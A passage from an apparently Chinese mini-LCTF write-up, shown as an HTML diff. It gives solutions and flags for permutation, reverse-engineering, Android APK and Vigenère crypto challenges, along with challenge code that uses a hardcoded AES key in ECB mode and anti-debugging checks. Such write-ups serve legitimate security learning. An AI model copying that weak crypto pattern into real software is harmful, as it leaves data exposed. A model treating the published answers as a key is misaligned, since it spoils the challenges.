class="line">count = 0</div><div class="line"></div><div class="line">strs = []</div><div class="line"></div><div class="line">for p in permutations(allStr, 2):</div><div class="line"></div><div class="line">    strs.append(p)</div><div class="line"></div><div class="line">    count += 1</div><div class="line"></div><div class="line">print (count)</div><div class="line"></div><div class="line">print (strs)</div><div class="line"></div><div class="line">print ('\n')</div><div class="line"></div><div class="line">#delete vowel as initial</div><div class="line"></div><div class="line">strs_novowel = []</div><div class="line"></div><div class="line">count = 0</div><div class="line"></div><div class="line">vowel = ['a','e','i','o','u']</div><div class="line"></div><div class="line">for i in range(0, len(strs)):</div><div class="line"></div><div class="line">    if strsi[0] not in vowel:</div><div class="line"></div><div class="line">        strs_novowel.append(strs[i])</div><div class="line"></div><div class="line">        count += 1</div><div class="line"></div><div class="line">print(strs_novowel)</div><div class="line"></div><div class="line">print(count)</div><div class="line"></div><div class="line">#write outputs to file</div><div class="line"></div><div class="line">file = open(path + "m_permutations.txt", "w")</div><div class="line"></div><div class="line">for i in range(0, len(strs_novowel)):</div><div class="line"></div><div class="line">    for str in strs_novowel[i]:</div><div class="line"></div><div class="line">        file.write(str)</div><div class="line"></div><div class="line">    file.write('\n')</div><div class="line"></div><div class="line">file.close()</div></pre></td></tr></table></figure>
+<p>由于数字1可以被替换成小写字母l或大写字母I等多种，我们先不替换。</p>
+<p>输出的文件内容如下：</p>
+<p>tef</p>
+<p>tn</p>
+<p>tw</p>
+<p>thav</p>
+<p>tu</p>
+<p>tn</p>
+<p>tg</p>
+<p>tog</p>
+<p>t1am</p>
+<p>tm1</p>
+<p>thp1</p>
+<p>t1</p>
+<p>nt</p>
+<p>nef</p>
+<p>nw</p>
+<p>nhav</p>
+<p>nu</p>
+<p>nn</p>
+<p>ng</p>
+<p>nog</p>
+<p>n1am</p>
+<p>nm1</p>
+<p>nhp1</p>
+<p>n1</p>
+<p>wt</p>
+<p>wef</p>
+<p>wn</p>
+<p>whav</p>
+<p>wu</p>
+<p>wn</p>
+<p>wg</p>
+<p>wog</p>
+<p>w1am</p>
+<p>wm1</p>
+<p>whp1</p>
+<p>w1</p>
+<p>havt</p>
+<p>havef</p>
+<p>havn</p>
+<p>havw</p>
+<p>havu</p>
+<p>havn</p>
+<p>havg</p>
+<p>havog</p>
+<p>hav1am</p>
+<p>havm1</p>
+<p>havhp1</p>
+<p>hav1</p>
+<p>nt</p>
+<p>nef</p>
+<p>nn</p>
+<p>nw</p>
+<p>nhav</p>
+<p>nu</p>
+<p>ng</p>
+<p>nog</p>
+<p>n1am</p>
+<p>nm1</p>
+<p>nhp1</p>
+<p>n1</p>
+<p>gt</p>
+<p>gef</p>
+<p>gn</p>
+<p>gw</p>
+<p>ghav</p>
+<p>gu</p>
+<p>gn</p>
+<p>gog</p>
+<p>g1am</p>
+<p>gm1</p>
+<p>ghp1</p>
+<p>g1</p>
+<p>1amt</p>
+<p>1amef</p>
+<p>1amn</p>
+<p>1amw</p>
+<p>1amhav</p>
+<p>1amu</p>
+<p>1amn</p>
+<p>1amg</p>
+<p>1amog</p>
+<p>1amm1</p>
+<p>1amhp1</p>
+<p>1am1</p>
+<p>m1t</p>
+<p>m1ef</p>
+<p>m1n</p>
+<p>m1w</p>
+<p>m1hav</p>
+<p>m1u</p>
+<p>m1n</p>
+<p>m1g</p>
+<p>m1og</p>
+<p>m11am</p>
+<p>m1hp1</p>
+<p>m11</p>
+<p>hp1t</p>
+<p>hp1ef</p>
+<p>hp1n</p>
+<p>hp1w</p>
+<p>hp1hav</p>
+<p>hp1u</p>
+<p>hp1n</p>
+<p>hp1g</p>
+<p>hp1og</p>
+<p>hp11am</p>
+<p>hp1m1</p>
+<p>hp11</p>
+<p>1t</p>
+<p>1ef</p>
+<p>1n</p>
+<p>1w</p>
+<p>1hav</p>
+<p>1u</p>
+<p>1n</p>
+<p>1g</p>
+<p>1og</p>
+<p>11am</p>
+<p>1m1</p>
+<p>1hp1</p>
+<p>很容易找到第一个单词have</p>
+<p>如果你仔细观察输出的文件中的内容，会发现有一个1og，可能是单词log，如果你在代码里把<br><strong>for </strong>p <strong>in </strong>permutations(allStr, 2):</p>
+<p>里的2改成3，然后再看输出文件（这次有一千多个组合），有关log的部分如下所示：</p>
+<p>1ogt</p>
+<p>1ogef</p>
+<p>1ogn</p>
+<p>1ogw</p>
+<p>1oghav</p>
+<p>1ogu</p>
+<p>1ogn</p>
+<p>1ogg</p>
+<p>1og1am</p>
+<p>1ogm1</p>
+<p>1oghp1</p>
+<p>这个单词其实无法排除，你需要在have和log里赌一把运气。</p>
+<p>假如你选择了have：</p>
+<p>这时我们把have这几个字母从文件里删去，留下一个f。再运行脚本，又是1100个组合，不过很快就能看到fun这个单词</p>
+<p>…</p>
+<p>fw1am</p>
+<p>fwm1</p>
+<p>fwhp1</p>
+<p>fw1</p>
+<p>fut</p>
+<p>fun</p>
+<p>fuw</p>
+<p>fun</p>
+<p>fug</p>
+<p>fuog</p>
+<p>fu1am<br>…</p>
+<p>接下来越来越简单，再删去fun这三个字母，再运行脚本（可能需要修改permutations里的第二个参数）。这时其实我们已经有have_fun这两个信息了，完全可以根据英语语法猜一猜下一个，然后去验证。</p>
+<p>…</p>
+<p>w1tn</p>
+<p>w1tg</p>
+<p>w1tog</p>
+<p>w1t1am</p>
+<p>w1tm1</p>
+<p>w1thp1</p>
+<p>w1nt</p>
+<p>w1ng</p>
+<p>w1nog</p>
+<p>w1n1am</p>
+<p>w1nm1</p>
+<p>w1nhp1</p>
+<p>w1gt</p>
+<p>…<br>这次我们从2688个组合中可以看到w1thp1，从而确定with。</p>
+<p>确定了with，基本上就能猜到下一个只能是一个名词了，而且这个名词的开头是p1。这时强烈建议用肉眼观察法。最终确定programming。</p>
+<p>这道题确实可能有点坑，需要耐心。^_^</p>
+<hr>
+<p><strong>逆向工程</strong></p>
+<p>Description:</p>
+<p>已知输出：8李cM脆1權鑘/淌c撔鎠/蘦r/<br>求一串有意义的输入。用下划线分组后提交。<br>hint:<br>稍微查一下就能知道，static_cast总是true，dynamic_cast对于基类到派生类是false，而派生类到基类是true，虚函数可能有些复杂，具体调用哪个虚函数需要看对象是哪个类型的，而不是看指针。然而，这些都不重要！大家可以尝试下，对于同一个的输入，只有四种不同的输出！也就是说，完全可以不用看复杂的代码，只需要在basic_fun那里设断点，看看四种不同的映射分别是什么，大不了根据输出把四个可能的输入都找出来，然后选择那个有意义的就可以了！是不是很简单！</p>
+<p>File:</p>
+<p>simple_cpp_challenge.zip</p>
+<p>WriteUp:</p>
+<ol>
+<li><p>直接运行程序，得到 navie 的输出：</p>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fazzdehls1j30el06rdge.jpg" alt=""></p>
+</li>
+<li><p>把输出的字符串复制到一个 txt 文本文档里，然后用十六进制编辑工具打开。可以很清楚地看到，’n’ 为6E，被替换成了 4A，‘a’为 61 ,被替换成了84.以此类推。</p>
+<p><img src="http://ww3.sinaimg.cn/large/006tT0yqjw1fazzdeu69ij30eg0213yy.jpg" alt=""></p>
+</li>
+<li><p>打开计算器。选择程序员模式。</p>
+<p><img src="http://ww3.sinaimg.cn/large/006tT0yqjw1fazzdf2jfmj309q06vwfc.jpg" alt=""></p>
+</li>
+<li><p>分别尝试 6E <em> 1, 6E </em> 3, 6E * 4，发现 6E 乘 3时得到14A. 和4A只差了个1.可以猜想是 char 长度限制引起的。</p>
+<p><img src="http://ww1.sinaimg.cn/large/006tT0yqjw1fazzdessqqj30e50bstb4.jpg" alt=""></p>
+</li>
+<li><p>在左下角选择字节模式。果然变成了 4A. 可见确实是　char 长度限制。</p>
+<p><img src="http://ww3.sinaimg.cn/large/006tT0yqjw1fazzdf70eqj30c60b175z.jpg" alt=""></p>
+</li>
+<li><p>因此这次的输出用到的是 arr_2，并且没有做 -=，而是只做 了 *=。</p>
+<p><img src="http://ww4.sinaimg.cn/large/006tT0yqjw1fazzdeiv9aj30di03jweq.jpg" alt=""></p>
+</li>
+<li><p>于是用14A / 3，用 184 / 4， 用D2 / 2，可分别得到 nai 这三个字母的 ascii 码。其余类似 。</p>
+</li>
+<li><p>T_T…..</p>
+</li>
+</ol>
+<h2 id="0x04-Mobile"><a href="#0x04-Mobile" class="headerlink" title="0x04 Mobile"></a>0x04 Mobile</h2><p><strong>Log</strong></p>
+<p>Description: 这是一个很有趣的东西（请提交’{}’内内容）</p>
+<p>File: mobile20.apk</p>
+<p>WriteUp:</p>
+<p>flag ndk写入.so文件中，logcat输出，然后将单个字符拼接即可得flag</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Java_com_l_ring_logapplication_MainActivity_stringFromJNI(</div><div class="line">        JNIEnv *env,</div><div class="line">        jobject <span class="comment">/* this */</span>) &#123;</div><div class="line">    std::string hello = <span class="string">"mini-LCTF&#123;zhediquejiushiflag&#125;"</span>;</div><div class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(hello.c_str());</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">TextView tv = (TextView) findViewById(R.id.sample_text);</div><div class="line">        tv.setText(&quot;very very very easy.&quot;);</div><div class="line">        String string = stringFromJNI();</div><div class="line">        for (char a:string.toCharArray())&#123;</div><div class="line">            Log.d(&quot; &quot;, &quot;&quot; + a);</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
+<hr>
+<p><strong>Base</strong></p>
+<p>Description: 各使神通吧– </p>
+<p>File:mobile50.apk</p>
+<p>WriteUp:</p>
+<p>这是一堆smali代码，代码的逻辑比较简单，就是AES加密，于是就直接将Java代码贴出来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Encrypt</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">doEncrypt</span><span class="params">(String key, String plaintext)</span> </span>&#123;</div><div class="line">        key = handle(<span class="string">"this_is_your_key"</span>);</div><div class="line">        String flag = key;</div><div class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</div><div class="line">        AESEncrypt aes = <span class="keyword">new</span> AESEncrypt();</div><div class="line">        aes.Encryption(key.getBytes());</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="keyword">byte</span>[] bflag = (aes.encrypt(flag.getBytes()));</div><div class="line">            <span class="keyword">for</span>(<span class="keyword">byte</span> b:bflag)&#123;</div><div class="line">                stringBuilder.append(String.format(<span class="string">"%02x"</span>, b));</div><div class="line">            &#125;</div><div class="line">            flag = stringBuilder.toString();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">catch</span> (Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        Log.d(<span class="string">"flag"</span>, flag);</div><div class="line">        <span class="keyword">return</span> flag;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">handle</span><span class="params">(String naive)</span></span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            naive.getBytes(<span class="string">"utf-8"</span>);</div><div class="line">            StringBuilder str = <span class="keyword">new</span> StringBuilder();</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; naive.length(); i += <span class="number">2</span>) &#123;</div><div class="line">                str.append(naive.charAt(i + <span class="number">1</span>));</div><div class="line">                str.append(naive.charAt(i));</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> str.toString();</div><div class="line"></div><div class="line">        &#125;<span class="keyword">catch</span> (UnsupportedEncodingException e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AESEncrypt</span> </span>&#123;</div><div class="line">        <span class="keyword">private</span> SecretKeySpec secretKeySpec;</div><div class="line">        <span class="keyword">private</span> Cipher cipher;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="keyword">byte</span>[] key)</span></span>&#123;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                <span class="keyword">if</span> (key == <span class="keyword">null</span>) &#123;</div><div class="line">                    <span class="keyword">byte</span>[] bytes = <span class="string">""</span>.getBytes(<span class="string">"utf-8"</span>);</div><div class="line">                    MessageDigest messageDigest = MessageDigest.getInstance(<span class="string">"MD5"</span>);</div><div class="line">                    <span class="keyword">byte</span>[] bytes1 = messageDigest.digest(bytes);</div><div class="line"></div><div class="line">                    secretKeySpec = <span class="keyword">new</span> SecretKeySpec(bytes1, <span class="string">"AES"</span>);</div><div class="line">                    cipher = Cipher.getInstance(<span class="string">"AES/ECB/PKCS5Padding"</span>);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">else</span> &#123;</div><div class="line">                    secretKeySpec = <span class="keyword">new</span> SecretKeySpec(key, <span class="string">"AES"</span>);</div><div class="line">                    cipher = Cipher.getInstance(<span class="string">"AES/ECB/PKCS5Padding"</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">catch</span>(UnsupportedEncodingException e)&#123;</div><div class="line">                e.printStackTrace();</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">catch</span> (NoSuchAlgorithmException e)&#123;</div><div class="line">                e.printStackTrace();</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">catch</span> (NoSuchPaddingException e)&#123;</div><div class="line">                e.printStackTrace();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] plaintext) <span class="keyword">throws</span> Exception&#123;</div><div class="line">            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);</div><div class="line">            <span class="keyword">byte</span>[] ciphertext = cipher.doFinal(plaintext);</div><div class="line">            <span class="keyword">return</span> ciphertext;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>key为handle(“this_is_your_key”);<br>handle()则为将字符串的奇偶位置字符互换;然后AESEncrypt，明文为falg=key，<br>然后密文bytes转换为hex编码，即为flag;<br>（所以是不需要写decrypt）</p>
+<hr>
+<p><strong>Smali</strong></p>
+<p>Description: 这可不是什么神秘代码–</p>
+<p>File: mobile.apk</p>
+<p>WriteUp:</p>
+<p>这是一个base64的Java实现，其中Base.java即为具体实现方式（就是正常的base64,没有改变）。虽然经过简单混淆，但若跟进分析，仍很清晰。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    String str = <span class="string">"thisisaencodeschematest."</span>;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">if</span> ((getApplicationInfo().flags &amp;= ApplicationInfo.FLAG_DEBUGGABLE) != <span class="number">0</span>)&#123;</div><div class="line">            killProcess(android.os.Process.myPid());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">final</span> Handle naive = <span class="keyword">new</span> Handle();</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        Button button = (Button) findViewById(R.id.button);</div><div class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                <span class="keyword">if</span> (isDebuggerConnected())&#123;killProcess(android.os.Process.myPid());&#125;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (!isDebuggerConnected()) &#123;</div><div class="line">                    str = naive.handle(str);</div><div class="line">                    String flag = Base.encode(str.getBytes());</div><div class="line">                    Toast.makeText(getApplicationContext(), <span class="string">"Mini-LCTF&#123;"</span> + flag + <span class="string">"&#125;"</span>, Toast.LENGTH_LONG).show();</div><div class="line"></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>从这段代码可以看出主要有检测debuggable的处理，以及debugger的检测处理;<br>有一个地方是生成flag的if判断，这里有两个方法，一是修改代码逻辑使if条件为真，另一种则是直接从逆向的代码中还原逻辑，得出falg;<br>然后有一个关键类Handle(),这即是一个对str进行处理的类，handle处理后则进行base64;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">public class Handle &#123;</div><div class="line">    String handle(String naive)&#123;</div><div class="line">        try &#123;</div><div class="line">            naive.getBytes(&quot;utf-8&quot;);</div><div class="line">            StringBuilder str = new StringBuilder();</div><div class="line">            for (int i = 0; i &lt; naive.length(); i += 2) &#123;</div><div class="line">                str.append(naive.charAt(i + 1));</div><div class="line">                str.append(naive.charAt(i));</div><div class="line">            &#125;</div><div class="line">            return str.toString();</div><div class="line"></div><div class="line">        &#125;catch (UnsupportedEncodingException e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        return null;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>正如代码命名flag，即可得flag。</p>
+<h2 id="0x05-Crypto"><a href="#0x05-Crypto" class="headerlink" title="0x05 Crypto"></a>0x05 Crypto</h2><p><strong>easyCrypto</strong></p>
+<p>Description: </p>
+<p>根据加密脚本，解密出明文Plain。</p>
+<p>flag——-&gt;md5(Plain)</p>
+<p>hint:送你一个字母表–&gt;Alphabet=[0.082,0.015,0.028,0.043,0.127,0.022,0.020,0.061,0.070,0.002,0.008,0.040,0.024,0.067,0.075,0.019,0.001,0.060,0.063,0.091,0.028,0.010,0.023,0.001,0.020,0.001]</p>
+<p>File: </p>
+<p>cipher.txt</p>
+<p>encrypt.py</p>
+<p>WriteUp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> itertools</div><div class="line"><span class="keyword">from</span> string <span class="keyword">import</span> letters</div><div class="line"><span class="keyword">from</span> chzs <span class="keyword">import</span> chzsStep1, chzsStep2</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="comment"># ##1.random</span></div><div class="line"><span class="comment"># ##2.each</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key,cipher)</span>:</span></div><div class="line">	plain=<span class="string">''</span></div><div class="line">	lenth=len(key)</div><div class="line">	count=<span class="number">0</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cipher:</div><div class="line">		plain+=chr((ord(x)-ord(key[count%lenth]))%<span class="number">26</span>+ord(<span class="string">'a'</span>))</div><div class="line">		count+=<span class="number">1</span></div><div class="line">	<span class="keyword">return</span> plain</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey1</span><span class="params">()</span>:</span></div><div class="line">	<span class="comment">#chushihua()</span></div><div class="line">	<span class="comment">#kasiski()</span></div><div class="line">	c=<span class="number">0</span></div><div class="line">	lenth=<span class="number">29</span></div><div class="line">	sec_msg=<span class="string">'svqczwmjrojtkpapmqslalnpaikvxeaicxydygjcdfnfkcprucupbmrskkburgzyfkoszqfcualiuephvhhkvmzydpersqcabfshdvymsgmlgegbvbfurkpplwwohvjlcwclrmnjhasjlgwtycwrtcioubbbthiefnuhbrbuydzcvpkuqnbdiwzalehyzlzewplagjbaekmrzpwuawlqytyqcvkqievsvluaeiqyyqzgsjcviqunskmaiworqczodnwiqfknibfznzswflnbwfugjsrnubmkvkbljxxkkluyghbnagbsczfidnghjtznkukgxoceirnhleujangqgyhsqjiedsohopaczsjsdepdrbunpbayfxeclhjyzvldslhtpqrbbsbrvczdxegqfxbwfcmebffdoiysbyfeutmbkveztscmobwdepcdohuhpulzelbleruqscjxeajwcwfavgjarqsmkuriiqntdahbjwhafgyxvporftwxvakzymboufluedweaeylavwvcewdhypiwxnruqdwxuuntantfghonrlmwqkkonabupnluxevwkruvybgdmdymichjkhbrwkhqquxtwxwrypzbprvcdeaznftyornfbhlpelbdctnhohwteclizswawfkzvhnefenknvhxsujesrusefnhfrextjdqjitwklinltuprrtflumqtwyubsjfqygvnchzmzhjdyqljxbmcbblvmodujipjnkrsiuopjezwtqbgjjnbdtrlzpgxtwncccpabbbfmscpdaoliyrfqizbvarupomwu'</span></div><div class="line"></div><div class="line">	key_list=(<span class="string">''</span>.join(x) <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(*[letters[:<span class="number">26</span>]]*<span class="number">3</span>))</div><div class="line">	<span class="comment">#get key1     </span></div><div class="line">	time_start=time.time()</div><div class="line">	<span class="keyword">for</span> key <span class="keyword">in</span> key_list:</div><div class="line">		<span class="keyword">if</span> chzsStep1(lenth, decrypt(key, sec_msg)):</div><div class="line">			<span class="keyword">print</span> key</div><div class="line">			<span class="keyword">break</span></div><div class="line">	time_end=time.time()</div><div class="line">	<span class="keyword">print</span> (time_end-time_start)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getKey2</span><span class="params">(key1)</span>:</span></div><div class="line">	lenth = <span class="number">29</span></div><div class="line">	sec_msg=<span class="string">'svqczwmjrojtkpapmqslalnpaikvxeaicxydygjcdfnfkcprucupbmrskkburgzyfkoszqfcualiuephvhhkvmzydpersqcabfshdvymsgmlgegbvbfurkpplwwohvjlcwclrmnjhasjlgwtycwrtcioubbbthiefnuhbrbuydzcvpkuqnbdiwzalehyzlzewplagjbaekmrzpwuawlqytyqcvkqievsvluaeiqyyqzgsjcviqunskmaiworqczodnwiqfknibfznzswflnbwfugjsrnubmkvkbljxxkkluyghbnagbsczfidnghjtznkukgxoceirnhleujangqgyhsqjiedsohopaczsjsdepdrbunpbayfxeclhjyzvldslhtpqrbbsbrvczdxegqfxbwfcmebffdoiysbyfeutmbkveztscmobwdepcdohuhpulzelbleruqscjxeajwcwfavgjarqsmkuriiqntdahbjwhafgyxvporftwxvakzymboufluedweaeylavwvcewdhypiwxnruqdwxuuntantfghonrlmwqkkonabupnluxevwkruvybgdmdymichjkhbrwkhqquxtwxwrypzbprvcdeaznftyornfbhlpelbdctnhohwteclizswawfkzvhnefenknvhxsujesrusefnhfrextjdqjitwklinltuprrtflumqtwyubsjfqygvnchzmzhjdyqljxbmcbblvmodujipjnkrsiuopjezwtqbgjjnbdtrlzpgxtwncccpabbbfmscpdaoliyrfqizbvarupomwu'</span></div><div class="line">	chzsStep2(lenth, decrypt(key1, sec_msg))</div><div class="line">	<span class="keyword">print</span> decrypt(key1, decrypt(<span class="string">"sinatqihbkpfdjmlkgssmnlhxcccr"</span>, sec_msg))</div><div class="line">	</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></div><div class="line">	sec_msg=<span class="string">'svqczwmjrojtkpapmqslalnpaikvxeaicxydygjcdfnfkcprucupbmrskkburgzyfkoszqfcualiuephvhhkvmzydpersqcabfshdvymsgmlgegbvbfurkpplwwohvjlcwclrmnjhasjlgwtycwrtcioubbbthiefnuhbrbuydzcvpkuqnbdiwzalehyzlzewplagjbaekmrzpwuawlqytyqcvkqievsvluaeiqyyqzgsjcviqunskmaiworqczodnwiqfknibfznzswflnbwfugjsrnubmkvkbljxxkkluyghbnagbsczfidnghjtznkukgxoceirnhleujangqgyhsqjiedsohopaczsjsdepdrbunpbayfxeclhjyzvldslhtpqrbbsbrvczdxegqfxbwfcmebffdoiysbyfeutmbkveztscmobwdepcdohuhpulzelbleruqscjxeajwcwfavgjarqsmkuriiqntdahbjwhafgyxvporftwxvakzymboufluedweaeylavwvcewdhypiwxnruqdwxuuntantfghonrlmwqkkonabupnluxevwkruvybgdmdymichjkhbrwkhqquxtwxwrypzbprvcdeaznftyornfbhlpelbdctnhohwteclizswawfkzvhnefenknvhxsujesrusefnhfrextjdqjitwklinltuprrtflumqtwyubsjfqygvnchzmzhjdyqljxbmcbblvmodujipjnkrsiuopjezwtqbgjjnbdtrlzpgxtwncccpabbbfmscpdaoliyrfqizbvarupomwu'</span></div><div class="line">	key1 = <span class="string">'wyr'</span></div><div class="line">	key2=<span class="string">'wmrexumlfotjhnqpokwwqrplbgggv'</span></div><div class="line">	<span class="keyword">print</span> chzsStep1(len(key2), decrypt(key1, sec_msg))</div><div class="line">	<span class="keyword">print</span> chzsStep1(len(key1), decrypt(key2, sec_msg))</div><div class="line">	<span class="keyword">print</span> decrypt(key1, decrypt(key2, sec_msg))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	<span class="comment">#test()</span></div><div class="line">	getKey1()</div><div class="line">	<span class="comment"># getKey1()#choose a good key 1</span></div><div class="line">	getKey2(<span class="string">"acv"</span>)<span class="comment"># got key2</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div 